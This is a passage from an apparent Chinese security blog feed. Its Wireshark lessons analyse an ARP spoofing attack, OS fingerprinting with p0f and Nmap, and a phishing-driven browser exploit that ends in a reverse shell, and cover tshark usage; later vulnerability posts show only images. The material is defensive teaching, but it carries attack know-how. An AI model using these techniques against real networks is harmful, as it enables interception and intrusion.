        <content type="html"><![CDATA[<p>##ARP欺骗的原理<br>ARP欺骗，有时也称为ARP缓存中毒，是通过发送包含有虚假MAC地址的ARP消息，以劫持其它计算机流量的过程，如下图所示：<br><img src="/2017/03/30/应对ARP攻击/1.jpg" alt="1"><br>ARP欺骗是一种在交换式网络中进行监听的高级技术。它通常由攻击者向客户端系统发送虚假地址的数据包，以截获特定的网络流量或者对目标进行拒绝服务攻击（DDoS）。然而，它也可以是一种在交换式网络中捕获目标系统数据包的合法方式。</p>
<p>根据地址解析协议，主机A要向主机B发送数据，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文，黑客接收到ARP Request广播包，就能够偷听到其它节点的IP和MAC地址，这样黑客就伪装为A，告诉B一个假地址，使得B发送给A 的数据包都被黑客截取，而A和B却一点都不知道。</p>
<p>可见，ARP攻击之所以有效，就是因为特意构造的ARP数据包使两台主机相信它们是在相互通信，而实际上它们却是与一个在中间转发数据包的第三方通信。  </p>
<p>##ARP攻击数据包分析<br>实验文件Lab37-1.pcap就包含有一个ARP攻击的例子。我们打开这个文件，会发现这些数据包看起来都很正常。但是，如果跟进这些数据包，就会发现受害者计算机（172.16.0.107）其实在使用搜索引擎进行搜索。搜索的结果出现了一些HTTP流量，并包含有一些DNS查询。</p>
<p>我们知道ARP欺骗攻击是发生在第二层的技术，因此如果只是在Packet List面板中浏览，是很难发现异常的。所以我们需要在Packet List面板中增加几列，来辅助我们的分析。这里可以选择菜单栏的Edit-&gt;Preferences，在新的窗口中选择左边的Columns，然后选择Add。输入Source MAC并回车，在Field type的下拉列表中，选择Hw src addr(resolved)，再将新添加的列拖拽到Source列的后面。接下来我们再添加一个名为Dest MAC的列，类型选择Hw dest addr(resolved)，并将其拖拽到Destination列的后面。最后点击Apply以及OK，使得设置生效：<br><img src="/2017/03/30/应对ARP攻击/2.jpg" alt="2"><br>这样我们在Packet List面板中，就可以看到新添加的两列了，即数据包的来源MAC地址以及目标MAC地址。由于我打开了MAC地址解析，所以还可以看到通信设备的MAC地址所对应的硬件名称。这个名称对于我们接下来的分析是很重要的。可以看到，起初的数据包是在一台Dell设备和一个Cisco设备之间传输的。但是从54号数据包开始，情况处出现了变化。可以发现这里出现了奇怪的ARP流量，该流量出现在Dell设备和新出现的HP设备之间：<br><img src="/2017/03/30/应对ARP攻击/3.jpg" alt="3"><br>对于这里出现的三个设备，我们可以先归纳出下表：<br><img src="/2017/03/30/应对ARP攻击/4.jpg" alt="4"><br>究竟是什么导致流量变得奇怪呢？其实我们可以回忆一下之前的课程中所讲的，ARP数据包有两种类型：请求和响应。用于请求的数据包会在网络上广播给所有的主机，以发现包含特定IP地址的机器的MAC地址。接着，响应数据包则会作为单播数据包发送给请求的设备。在这个情况下，我们就可以从通信的序列中发现一些情况。</p>
<p>首先，54号数据包是MAC地址为00:25:b3:bf:91:ee的攻击者发送的ARP请求，它作为单播数据包直接发送给了MAC地址为00:21:70:c0:56:f0的受害者。按道理，这种类型的请求应当采用广播的形式发送到网络的所有主机上，但是它却只发送给了受害者。我们又注意到尽管这个数据包是攻击者发送的，并且在ARP头部包含了攻击者的MAC地址，但是它却列出了路由器的IP地址，而不是它自己的地址。</p>
<p>紧随着这个数据包的是受害者发给攻击者的响应，包含有它的MAC地址信息。而在第56号数据包中，攻击者给受害者发送了一个包含有未请求的ARP响应数据包，告诉受害者172.16.0.1所对应的MAC地址是00:25:b3:bf:91:ee。要知道，172.16.0.1所对应的MAC地址应当是00:26:0b:21:07:33，也就是路由器的真实地址。由于ARP协议设计上的缺陷，也就导致了受害者将本应该发送到路由器的数据包发送给了攻击者。一旦受害者和路由器两边都上当，那么二者的通信就会流经攻击者的计算机，如下图所示：<br><img src="/2017/03/30/应对ARP攻击/5.jpg" alt="5"><br>57号数据包可以确认攻击取得成功。因为当我们用ARP攻击之前的数据包（如40号数据包）与其进行比较的时候，可以发现远程服务器的IP地址是一致的，但是MAC地址却变化了。由MAC地址的变化就可以知道，数据包在抵达路由器之前将会被攻击者所接收。</p>
<p>可见，ARP欺骗是比较狡猾的，也是难以被检测到的。如果想要发现这种攻击，往往需要通过专门配置入侵检测系统（IDS）才可以，或者在设备上使用专门的能够检测ARP表项变化的软件。因为有时我们需要利用ARP欺骗来对网络中的数据包进行分析，以找出网络中的故障，所以全面地了解这种技术的细节，是很有必要的。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[分析一个网站的流量情况]]></title>
        <url>https://517736522.github.io/2017/03/30/%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%81%E9%87%8F%E6%83%85%E5%86%B5/</url>
        <content type="html"><![CDATA[<p>##利用会话窗口进行分析<br>我曾经在本系列课程的基础篇中介绍过一些重要的窗口的知识，那么这次我们就借助于各种各样的窗口来实际分析一个网站的流量情况。这里我们打开实验文件Lab34-1.pcap，这是在访问一个体育资讯网站时所捕获到的数据包。可以看到，这个捕获文件中包含有九百多个数据包，因此我们不可能通过纯手工的方式进行分析。而之所以会出现这么多的数据包，其中很大的一个原因是现在的网站为了美观的考虑，会在网页中添加大量花哨的设计，因此就需要用众多的数据包来传送这一类的数据，这些数据也是非常耗费流量的。那么对于这些生成的网络流量，如果能够知道它们的来源，对于我们分析这个网站是非常有用的，特别是它究竟有一个来源还是多个来源。那么为了实现这类分析的工作，我们可以使用Wireshark的会话窗口（Statistics-&gt;Conversations）来实现：<br><img src="/2017/03/30/分析一个网站的流量情况/1.jpg" alt="1"><br>由上图可见，捕获文件中包含有14个IP会话、25个TCP连接以及14个UDP会话。所有的会话都详细地显示在了会话的主窗口中，对于一个网站来说，这些会话算是比较多的了。  </p>
<p>##使用协议分层统计窗口分析<br>为了更好地进行观察，我们可以进一步详细分析一下这些TCP和UDP连接上使用的应用层协议，打开协议分层统计窗口（Statistics-&gt;Protocol Hierarchy），如下图所示：<br><img src="/2017/03/30/分析一个网站的流量情况/2.jpg" alt="2"><br>可以看到，TCP在捕获文件中占了97.07%的数据包，UDP占了剩下的2.93%。而这些TCP流量都是由HTTP生成的，甚至可以进一步按照HTTP传输的文件类型进行细分。</p>
<p>大家看到这里的数据可能会产生疑惑，Wireshark显示只有12.76%的HTTP，但是我却说TCP里面所有的流量都是由HTTP产生的，这是为什么呢？其实，余下的84.31%的流量属于纯TCP流量，也就是用于数据传输和控制的数据包。然后我们再看一下UDP的下方，可看到UDP的流量都是由DNS组成的。</p>
<p>依据这些信息，我们就可以进行归纳。首先，在这个捕获文件中，DNS的事务很少，其中的28个DNS数据包也就意味着这里面包含有14个DNS事务（请求与响应算一个事务）。如果我们再回到会话窗口，可以看到UDP的数量确实是14个，这也就验证了我们的分析。</p>
<p>然而DNS查询并不会独自发生，而捕获文件中的其它流量也就只剩下了HTTP。这就告诉我们，该网站的HTML代码很可能通过域名引用了其它域或者子域，从而导致执行了多个查询的工作。</p>
<p>下面我们可以继续收集资料来证实我们的推测。  </p>
<p>##分析DNS流量<br>分析DNS流量最为简单的方法是创建一个筛选器，比如直接在筛选器中输入dns（注意小写），就可以显示所有的DNS流量了：<br><img src="/2017/03/30/分析一个网站的流量情况/3.jpg" alt="3"><br>可以看到，这些DNS流量全都以查询响应的方式成对出现。为了更好地查看被查询的域名，我们可以创建一个只显示查询数据包的筛选器。在Packet List面板中选择一个查询，然后在Packet Details面板中展开数据包的DNS头部，然后右键点击Flags:0x0100（Standard quary）域，之后移动到Apply as Filter，选择Selected：<br><img src="/2017/03/30/分析一个网站的流量情况/4.jpg" alt="4"><br>这就会激活筛选器dns.flags==0x0100，使得窗口上只剩下了查询数据包，就可以方便地读取我们正在分析的记录。这样我们就可以知道所访问的域名，而其他的DNS请求其实都与该域名相关。  </p>
<p>#分析HTTP请求<br>最后我们再看一下HTTP请求来验证一下这些查询的来源。我们先清空筛选器，然后可以在菜单栏中选择Statistics-&gt;HTTP，选择Requests，然后单击Create Stat：<br><img src="/2017/03/30/分析一个网站的流量情况/5.jpg" alt="5"><br>这里就显示了HTTP Requests窗口，这里面的14个连接，每一行代表一个与特定域名的连接，这也解释了DNS请求代表的所有域名的情况。看到这些连接，大家可能会想知道这个复杂的过程到底用了多长的时间。那么最简单的方法就是查看这些流量的概述信息，也就是选择Statistics-&gt;Summary：<br><img src="/2017/03/30/分析一个网站的流量情况/6.jpg" alt="6"><br>可以看到整个过程是在2.047秒完成的，这是一个正常的水平。</p>
<p>那么对于我们的这个捕获文件而言，查看一个网页的简单请求，被分解成了14个独立的域和子域的连接，还和种种不同的服务器做了交互，并且整个过程用了2秒完成。那么当我们在访问网站的时候，不妨也使用Wireshark进行抓包，类似于我们这次课程的方法来分析一下你所得到的捕获文件，作为一个课后练习。只有去分析这些数据包，才能够知道数据究竟来自哪里。才能够对这个网站有更加深入的了解。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[嗅探目标操作系统的信息]]></title>
        <url>https://517736522.github.io/2017/03/30/%E5%97%85%E6%8E%A2%E7%9B%AE%E6%A0%87%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BF%A1%E6%81%AF/</url>
        <content type="html"><![CDATA[<p>##被动型指纹技术<br>被动型指纹技术通过分析目标系统发送的网路数据包的某些域来确定目标究竟使用了哪一种操作系统。这种技术之所以称作“被动”，是因为我们只监听目标主机发送的数据包，但是并不主动向目标发送任何网络流量。对于黑客来说，这是最理想的操作系统指纹技术，因为它非常地隐蔽。</p>
<p>那是不是说，我们只需要获取到目标主机发送的数据包，就可以确定它采用的是哪种操作系统了呢？这种方式看起来确实很容易。在RFC文档所定义的协议中，并没有规定每个域的默认值，不同的操作系统如果想要实现TCP/IP协议，都会依据自己的准则来填充相关域的默认值。因此根据这些默认值，基本就可以获取到操作系统的信息了。那么我们只需要关注目标数据包的TCP和IP头部的相关域的内容就可以了。下表列出了一些与操作系统实现有关的常见域及其默认值：<br><img src="/2017/03/30/嗅探目标操作系统的信息/1.jpg" alt="1"><br>捕获文件Lab36-1.pcapng以及Lab36-2.pcapng中的数据包分别来自两个不同的操作系统，都是在该操作系统下，利用网页浏览器打开百度主页，所获得的数据包。这里我们可以结合上表，首先分析一下Lab36-1.pcapng中的相关域的情况：<br><img src="/2017/03/30/嗅探目标操作系统的信息/2.jpg" alt="2"><br>对于这个实验文件，在IP头部可以看到，不分片标志是Set的状态，初始TTL的值为128。接下来在TCP头中，窗口大小为65535，最长的段的大小为1460bytes，SACK处于Set的状态。<br><img src="/2017/03/30/嗅探目标操作系统的信息/3.jpg" alt="3"><br>接下来看一下Lab36-2.pcapng文件的情况：</p>
<p>对于这个实验文件，在IP头部可以看到，不分片标志是Set的状态，初始TTL的值为64。接下来在TCP头中，窗口大小为29200，最长的段的大小为1460bytes，SACK处于Set的状态。</p>
<p>将这两组数据进行分类，得到下表：<br><img src="/2017/03/30/嗅探目标操作系统的信息/4.jpg" alt="4"><br>捕获文件1的TTL的值为128，那么有可能是Novell或者Windows操作系统，由于Novell的SackOK的值应当是Not Set，所以捕获文件1所处的设备所运行的是Windows操作系统的可能性最大。捕获文件2的判断方式与捕获文件1类似，结合表格，找到TTL与SackOK的交集，就可以知道捕获文件2所处的设备所运行的是Linux操作系统的可能性最大。而事实也正是如此，Lab36-1.pcapng是在Windows XP SP3系统上捕获的，而Lab36-2.pcapng是在Kali Linux 1.0.7系统上捕获的。</p>
<p>这里请大家注意的是，第一张表格所列出的被动型操作系统指纹技术的常见识别域并不完整。很多具体的实现细节可能会导致真实值与期望值出现很大的偏差。所以我们在实际的分析中，不可以完全依赖被动型操作系统指纹技术所得到的结果。</p>
<p>为了得到更加准确的分析结果，我们可以使用一款名为p0f的工具来识别操作系统的指纹。该工具可以分析我们所捕获的数据包的相关域，然后输出可能的操作系统。使用像p0f这样的工具，不仅能够了解到操作系统的架构，有时甚至能了解到版本号或者补丁级别。即便目标系统上安装有性能优良的防火墙也没有问题。这里我在Kali Linux系统中使用p0f分析Lab36-1.pcapng的结果如下：<br><img src="/2017/03/30/嗅探目标操作系统的信息/5.jpg" alt="5"><br>这里需要我们打开终端使用命令行来操作，首先需要输入工具名p0f，然后的-r表示后面就是所要分析的文件，之后是文件的完整路径，回车就可以看到详细的分析结果了。该结果中显示了客户端与服务器的详细信息，包括操作系统的类型、地址、以太网模式、运行的服务器和端口号等。可以看到，它已经准确地识别出了Windows XP操作系统。然后可以再看一下Lab36-2.pcapng的情况：<br><img src="/2017/03/30/嗅探目标操作系统的信息/6.jpg" alt="6"><br>这里同样识别出了Linux 3.11或以上版本。  </p>
<p>##主动型指纹技术<br>如果被动监听流量并不能够得到想要的结果，那么此时就需要采用更加直接的手段。这种方法就叫做“主动型指纹技术”。它是指攻击者主动向目标主机发送特意构造的数据包以引起响应，然后从回应的数据包中获取目标计算机操作系统信息的技术。当然，由于这种方法需要与目标主机直接通信，所以并不隐蔽，但是却可以达到准确和高效的效果。</p>
<p>实验文件Lab36-3.pcap是在利用Nmap扫描工具发起主动型指纹扫描的例子：<br><img src="/2017/03/30/嗅探目标操作系统的信息/7.jpg" alt="7"><br>这个捕获文件中，有一些是Nmap发送的探测数据包，这些探测数据包引起的响应可以用于识别操作系统。Nmap记录下对这些探测数据包的响应并创建一个指纹，与指纹数据库对比后就可以得出结论。当然，这个捕获文件只是展示了Nmap在进行目标操作系统嗅探时所收发的数据包的情况，我们并不能从这些数据包中直接地了解到目标操作系统的信息，而是需要Nmap来帮我们解析。</p>
<p>Nmap这个工具也可以在Kali Linux系统中直接使用，有兴趣的朋友可以参考相关的课程。  </p>
<p>##小结<br>我们这次课程中所讲的p0f以及Nmap工具都是集成在Kali Linux系统中的，由此可见Kali Linux系统确实非常适合于Web安全或者渗透测试的研究。如果大家看过一部名为《黑客军团》的美剧，就可以发现里面的黑客在进行渗透的时候，使用的就是Kali Linux。我个人认为，想要学好这方面的知识，至少要达成三个阶段的学习，第一个阶段就是需要熟悉Kali Liunx中的各种工具的使用方法，第二个阶段就是需要利用相关工具，结合诸如社会工程学这样的知识，进行实际的渗透研究。而第三个阶段，我建议大家要精通至少一门的脚本语言，这样在实际的渗透过程中，就可以私人订制一些实用的脚本程序，从而帮助我们达到目标。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[一个网络钓鱼的案例]]></title>
        <url>https://517736522.github.io/2017/03/30/%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E7%9A%84%E6%A1%88%E4%BE%8B/</url>
        <content type="html"><![CDATA[<p>##数据包分析<br>我们的捕获文件是从用户单击钓鱼邮件中的连接的那一刻开始，也就是实验文件Lab38-1.pcap。在这个捕获文件中，最开始是以受害者（192.168.100.206）和攻击者（192.168.100.202）之间的TCP三次握手开始的。初始化连接所使用的是80号端口，也就说明了这是HTTP的流量。关于这一点，可以从第四个数据包中证实，它是一个对/info的HTTP GET请求（注意这是由受害者向攻击者发出的）：<br><img src="/2017/03/30/一个网络钓鱼的案例/1.jpg" alt="1"><br>攻击者在收到了GET请求之后，就会在6号数据包中返回一个302 Moved信息，这会使得浏览器被重定向到另一个页面。而与302一起来的还有一个Location域，它指明了重定向的位置：<br><img src="/2017/03/30/一个网络钓鱼的案例/2.jpg" alt="2"><br>接下来，客户端在收到HTTP 302数据包后，在7号数据包中初始化了另一个针对重定向网站URL的GET请求，之后的8号数据包，攻击者向受害者发送了一个ACK数据包，接下来的数据包则是由攻击者发往受害者的数据。那么为了更好地分析这些数据，我们可以用鼠标右键单击TCP流中的任何一个数据包，选择Follow TCP Stream：<br><img src="/2017/03/30/一个网络钓鱼的案例/3.jpg" alt="3"><br>在这个对话框中，我们看到了初始GET请求，302重定向以及第二个GET请求。接下来我们可以发现一大段非常奇怪的内容。它们是位于[removed]标签内的一系列随机的数字和字母。HTML中的[removed]标签表示这是一种脚本语言。在这个标签里面，正常来说是应当看到一些脚本语句的。但是这些乱码表明真正的内容可能已经被加密了。不过由于我们已经知道了攻击者其实是在利用IE浏览器的漏洞，从而实施攻击。那么我们可以假设这段乱码很可能包含有 shellcode。在这段乱码的后面，我们就可以看到一些可读的文本：<br><img src="/2017/03/30/一个网络钓鱼的案例/4.jpg" alt="4"><br>即便我们不懂这种脚本语言，但是通过英文单词（String.fromCharCode）也可以猜测这段代码其实是在执行字符串的操作，而这段脚本也在[removed]的标志位置结束了。</p>
<p>接下来的<span>位置内容，同样是攻击者发给受害者的内容，这些内容有可能是恶意行为的标志，这里面包含有难以分辨的随机字符串或者是经过加密的文本。</span></p>
<p>在<span>标签中包含了一个iframe，这是攻击者常用的手法，用于在HTML的页面中嵌入额外的内容。<iframe\>标签创建了一个内联帧，不会被用户所察觉。这里的&lt;\iframe>标签引用了一个名字古怪的GIF文件。当受害者的浏览器发现对这个文件的引用时，就会利用21号数据包发送一个GET请求，接下来的23号数据包就说明这个文件被传送过来了。而这个GIF文件很可能被用来以某种方式，来触发受害者计算机中的漏洞。</iframe\></span></p>
<p>接下来的25号数据包，受害者尝试连接攻击者的4321号端口。关于这个TCP流的具体信息，我们依旧可以查看Follow TCP Stream：<br><img src="/2017/03/30/一个网络钓鱼的案例/5.jpg" alt="5"><br>值得我们注意的是，这里出现了Windows的命令提示符。这个shell是由受害者发给攻击者的，说明攻击者成功利用了漏洞。一旦漏洞利用程序启动，受害者就会给攻击者发送命令提示符。可以看到，红色部分是由受害者发出的，蓝色部分是由攻击者发出的。攻击者在这里发来了一个dir指令，于是就看到了受害者计算机中的内容。</p>
<p>此时的攻击者就会对受害者的计算机获取控制权限，他几乎可以做任何事情。受害者起初不过是点了几下鼠标，几秒钟之内就把计算机的控制权交给了攻击者。   </p>
<p>##总结<br>类似于我们这次所讨论的漏洞利用程序，在网络上传输时通常都会经过编码加密成不可识别的形式，以避免被入侵检测系统（IDS）发现。就这次的情况而言，在没有对这个漏洞利用程序的进一步了解，也没有该程序的样本的情况下，很难说清楚受害者的系统上到底发生了什么。但是依旧可以在Wireshark所捕获到的数据包中发现恶意程序的一些蛛丝马迹。这包括[removed]标签里面的一些混淆文本、奇怪的iframe以及命令提示符。</p>
<p>我们这里可以总结一下这次的漏洞利用程序的工作原理：<br>1、受害者收到一封来自攻击者的邮件，虽然邮件看起来合理，但是事实上却是网络钓鱼，单击里面的一个连接，就会向攻击者的恶意网站发送一个GET请求（4号数据包）。 2、攻击者的Web服务器向受害者发出302消息以进行重定向（6号数据包），受害者的浏览器就会执行重定向，发起一个GET请求（7号数据包）。 3、攻击者的Web服务器向客户端发送一个含有混淆的JavaScript（包含一个漏洞利用程序）的Web页面，以及一个含有恶意GIF图像连接的iframe（9号数据包）。 4、受害者向恶意gif文件发起一个GET请求，将它从服务器上下载下来（21号数据包）。 5、利用IE浏览器的漏洞，让恶意文件在受害者机器上运行，触发漏洞。 6、一旦漏洞被成功利用，攻击者就能够通过命令提示符输入命令，获得受害者计算机的控制权。  </p>
<p>为了防御这种攻击，我们可以通过这个捕获文件为IDS创建一个特征，可以有助于检测这种攻击。比如，我们可以找到捕获文件中没有被混淆的部分，比如[removed]标签里面末尾出的明文代码。或者为所有包含302重定向到特定URL的HTTP流量设置一个特征。这是预防网络未知威胁的有效手段。有兴趣的朋友可以参考关于Snort特征的相关资料，也可以学习《恶意代码分析实战》的相应内容。而下节课也会对Snort特征的知识有所涉及。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[wireshark的命令行模式]]></title>
        <url>https://517736522.github.io/2017/03/28/wireshark%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
        <content type="html"><![CDATA[<p>##命令行的特点<br>只要我们在计算机中安装了Wireshark，那么在其安装目录中就可以找到tshark这款工具：<br><img src="/2017/03/28/wireshark的命令行模式/1.jpg" alt="1"><br>它的下方名为tshark.html的文件就是这款工具的帮助信息。注意这款工具并不是通过直接在这里双击运行的，而是需要通过cmd命令行切换到wireshark的安装目录，然后再通过相应的命令来使用这款工具。或者直接将tshark加入环境变量就可以直接使用。</p>
<p>而我之所以要以一节课来论述这款工具，是因为我们在实际的分析中，为了得到精准的分析结果，往往需要通过编写脚本程序来实现我们的目的。比如假设我们想要统计某一个捕获文件中由于某一条件导致的停滞共有多少毫秒，那么显然仅仅通过Wireshark生成的图形进行统计是不精确的。而传统的做法就需要把符合该条件的数据包筛选出来，逐段统计停滞的时间。如果捕获文件不复杂，那么统计的速度还会比较快，可是一旦出现复杂的网络状况，那么这种纯手工的方式就明显力不从心了。</p>
<p>遇到这种情况，我们就需要使用脚本程序来辅助我们的分析，可是Wireshark本身并没有提供这样的功能，因此我们就需要利用tshark这款命令行工具来引入相应的脚本程序。脚本程序的编写不是我们课程的讨论范围，但是依旧有必要讨论tshark的基本用法，其实它就是相当于Wireshark的命令行版本。与图形界面相比，命令行存在着一些先天的优势：</p>
<p>可以使用诸如awk或者grep这样的工具来辅助分析。这一点就是图形界面无法实现的。而有些高手之所以说tshark的功能比Wireshark强大，往往就是由于这个原因。这里所说的awk可以将文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。而grep可以用于字符串的查找。但是这些工具一般需要在Linux系统中才能实现。这里我可以给大家展示一下tshark与grep的使用。我使用的是Kali Linux 1.0.7的操作系统，利用如下命令搜索Lab5-1.pcapng中含有GET字符串的数据包：    </p>
<p><img src="/2017/03/28/wireshark的命令行模式/2.jpg" alt="2"><br>上述命令的意思是，使用tshark来读取Lab5-1这个文件的内容，并且使用grep这款工具来匹配文件中是否包含有GET字符的数据包。可以看到，结果已经清晰地显示出来了。</p>
<p>编辑命令虽然比较费时，但是编辑好之后可以反复使用，甚至可以写成一个程序供以后使用。如果大家经常需要进行性能调优的操作，那就可以写一段程序来完成，这会比直接使用Wireshark要快得多。而进行性能调优主要是对Summary（概述信息）、Service Response Time（服务响应时间）以及Expert Info Composite（专家信息整合）的内容进行分析。</p>
<p>比如Summary可以通过capinfos进行查询（注意我已经将Lab5-1.pcapng放在了Wireshark目录中）：<br><img src="/2017/03/28/wireshark的命令行模式/3.jpg" alt="3"><br>而如果想要获取Service Response Time的情况，则需要视不同的协议而定。比如对于NFS（网络文件系统）协议可以使用以下命令：<br><img src="/2017/03/28/wireshark的命令行模式/4.jpg" alt="4"><br>上述命令中的-n表示禁止所有地址名字解析（默认为允许所有）；-q设置为标准输出（常用于统计）；-z表示设置统计参数。</p>
<p>而对于CIFS协议，只要把上述命令中的双引号里面的内容改为“smb,srt”即可：<br><img src="/2017/03/28/wireshark的命令行模式/5.jpg" alt="5"><br>tshark输出的分析文本大多可以直接写入分析报告里面，而Wireshark却无法生成这样的报告。比如，我想统计每一秒里面CIFS操作的Service Response Time，那么可以执行以下命令：<br><img src="/2017/03/28/wireshark的命令行模式/6.jpg" alt="6"><br>如果将这个结果导入到Excel里面，就可以生成各种报表。</p>
<p>和其它软件一样，命令行往往比图形界面快得多。比如现在有一个捕获文件，里面有众多的数据包，但是我只对IP地址为74.125.23.102的数据包感兴趣，如果使用Wireshark操作的话，需要首先打开捕获文件，再利用ip.addr==74.125.23.102进行筛选，最后保存结果。其实这三个步骤还是比较费时的。可是如果使用tshark就只需要以下一条命令就可以了：<br> tshark –r Lab5-1.pcapng –Y “ip.addr==74.125.23.102” –w Lab5-4.pcapng<br>这样，生成的Lab5-4.pcapng文件中就会只包含有IP地址为74.125.23.102的数据包了。</p>
<p>由于以上4点优势，一个网络工程师可能在上手tshark之后，很快就会舍弃Wireshark了。虽然我们这个系列的课程是教大家使用Wireshark，但是当大家掌握了足够多的经验的时候，其实完全可以舍弃Wireshark的友好界面，转而使用更加高效，却更加复杂的tshark。  </p>
<p>##命令行的常用功能  </p>
<p>除了上述给大家演示的几种功能之外，这里再给大家讲解几个命令行的常用功能。如果想统计重传的状况，则需要用到tcp.analysis.retransmission命令：<br><img src="/2017/03/28/wireshark的命令行模式/7.jpg" alt="7"><br>如果想查看乱序的情况，则只需要将retransmission改为out_of_order即可。</p>
<p>我们在之前的课程中讨论过会话窗口，那么我们利用tshark也可以方便地查看会话信息。利用”conv,xxx”就可以做到。其中的xxx可以是tcp、udp或者ip。比如查看TCP的会话信息：<br><img src="/2017/03/28/wireshark的命令行模式/8.jpg" alt="8"><br>大家可以将命令行的结果与Wireshark的会话窗口进行对比，看看是否一致。  </p>
<p>最后，如果我们遇到了一个非常大的捕获文件，使用tshark无法打开该怎么办？那么此时就需要将该文件切分成多个，可以利用editcap来实现：  </p>
<p>editcap Lab5-1.pcapng output.pcapng –i 4  </p>
<p>上述命令可以把Lab5-1.pcapng这个文件以4秒为间隔进行拆分。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 基础篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解任意文件下载漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p>##KPPW2.2CMS:<br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解任意文件下载漏洞/9.jpg" alt="9">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解CSRF漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3CSRF%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/3.jpg" alt="3">  </p>
<p>##D-Link路由器：<br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/4.jpg" alt="4"><br>exp模拟一个图片请求<br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/5.jpg" alt="5"><br>如果直接访问而没有验证的话，那么就不会显示<br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/7.jpg" alt="7"><br>再次访问就按照构造好的数据包执行了<br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解CSRF漏洞/10.jpg" alt="10">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[高精度字典生成]]></title>
        <url>https://517736522.github.io/2017/03/28/%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/高精度字典生成/1.jpg" alt="1"><br><img src="/2017/03/28/高精度字典生成/2.jpg" alt="2"><br><img src="/2017/03/28/高精度字典生成/3.jpg" alt="3"><br><img src="/2017/03/28/高精度字典生成/4.jpg" alt="4"><br><img src="/2017/03/28/高精度字典生成/5.jpg" alt="5"><br><img src="/2017/03/28/高精度字典生成/6.jpg" alt="6">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解CMSEasy5.5代码执行漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3CMSEasy5.5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
